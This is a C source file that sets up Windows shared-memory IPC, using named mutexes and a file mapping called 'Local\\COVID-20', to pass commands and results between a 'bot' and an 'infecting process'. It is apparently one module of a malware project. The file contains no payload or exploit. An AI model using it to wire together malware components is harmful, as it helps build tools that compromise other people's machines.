#include "ipc_manage.h"

#include <stdio.h> //Debug
#include <Windows.h>

#define MUTEX_SENDING "MUTEX_BOT_T_INFECTING"
#define MUTEX_RECEIVING "MUTEX_INFECTING_TO_BOT"

static BYTE can_operate = 0;
static HANDLE hFileMap;
static HANDLE hMutexRecv;
static HANDLE hMutexSend;
static PCHAR lpBufferSend;
static PCHAR lpBufferRecv;
static size_t szBufferSend = 100;
static size_t szBufferRecv = 900;

void IPC_INIT()
{
	//Locals
	DWORD res;
	PCHAR recv_section;

	//Creating Mutexes
	hMutexRecv = CreateMutexA(NULL, FALSE, MUTEX_RECEIVING);
	hMutexSend = CreateMutexA(NULL, FALSE, MUTEX_SENDING);
	if (hMutexRecv == NULL || hMutexSend == NULL)
	{
#ifdef _DEBUG
		printf("%s %d\n", "IPC_INIT: CreateMutex failed error no.", GetLastError());
#endif
		return;
	}
	
	//STEP-1 CreateFileMapping
	hFileMap = CreateFileMapping(
		INVALID_HANDLE_VALUE,
		NULL,
		PAGE_READWRITE,
		0,
		szBufferSend + szBufferRecv,
		L"Local\\COVID-20"
	);

	if (hFileMap == FALSE)
	{
#ifdef _DEBUG
		printf("%s %d\n", "IPC_INIT: CreateFileMapping failed error no.", GetLastError());
#endif
		return;
	}

	//wait for Infecting process to send data / connect
	do
	{
		res = WaitForSingleObject(hMutexRecv, 0);
		ReleaseMutex(hMutexRecv);
	} while (res != WAIT_OBJECT_0);

	//wait for Infecting process to finish writing
	WaitForSingleObject(hMutexRecv, INFINITE);
	
	//STEP-2 MapViewOfFile
	lpBufferRecv = MapViewOfFile(
		hFileMap,
		FILE_MAP_ALL_ACCESS,
		0,
		0,
		szBufferSend + szBufferRecv
	);

	if ( lpBufferRecv == NULL)
	{
#ifdef _DEBUG
		printf("%s %d\n", "IPC_INIT: MapViewOfFile failed error no.", GetLastError());
#endif
		return;
	}

	//point to recv section
	recv_section = lpBufferRecv + szBufferSend;

	if (strncmp(recv_section, MUTEX_RECEIVING, strlen(MUTEX_RECEIVING)))
		can_operate = 1;
	
	//STEP-3 UnmapViewofFile
	UnmapViewOfFile(lpBufferRecv);

	//finished reading data
	ReleaseMutex(hMutexRecv); 
}

int send_command(uint8_t* buffer, uint32_t size)
{
	if (can_operate == 0)
	{
#ifdef _DEBUG
		printf("%s\n", "send_command: can't operate");
#endif
		return 1;
	}

	//waiting for the Infecting process finish reading
	WaitForSingleObject(hMutexSend, INFINITE);
	
	//Create MapViewOfFile
	lpBufferSend = MapViewOfFile(
		hFileMap,
		FILE_MAP_ALL_ACCESS,
		0,
		0,
		szBufferSend + szBufferRecv
	);

	if (lpBufferSend == NULL)
	{
#ifdef _DEBUG
		printf("%s %d\n", "send_command: MapViewOfFile failed error no.", GetLastError());
#endif
		return 1;
	}

	//copy data
	CopyMemory(lpBufferSend, buffer, size);

	//Write changes
	UnmapViewOfFile(lpBufferSend);

	//release mutex
	ReleaseMutex(hMutexSend);
	return 0;
}

int recv_result(uint8_t* dst, uint32_t size)
{
	PCHAR recv_section;

	if (can_operate == 0)
	{
#ifdef _DEBUG
		printf("%s\n", "recv_result: can't operate");
#endif
		return 1;
	}

	//wait for the infecting process finish writing
	WaitForSingleObject(hMutexRecv, INFINITE);

	lpBufferRecv = MapViewOfFile(
		hFileMap,
		FILE_MAP_ALL_ACCESS,
		0,
		0,
		szBufferSend + szBufferRecv
	);

	if (lpBufferRecv == NULL)
	{
#ifdef _DEBUG
		printf("%s %d\n", "recv_result: MapViewOfFile failed error no.", GetLastError());
#endif
		return 1;
	}

	//point to recv section
	recv_section = lpBufferRecv + szBufferSend;
	
	//read data
	CopyMemory(dst, recv_section, size);

	//UnmapViewOfFile
	UnmapViewOfFile(lpBufferRecv);

	ReleaseMutex(hMutexRecv);
	return 0;
}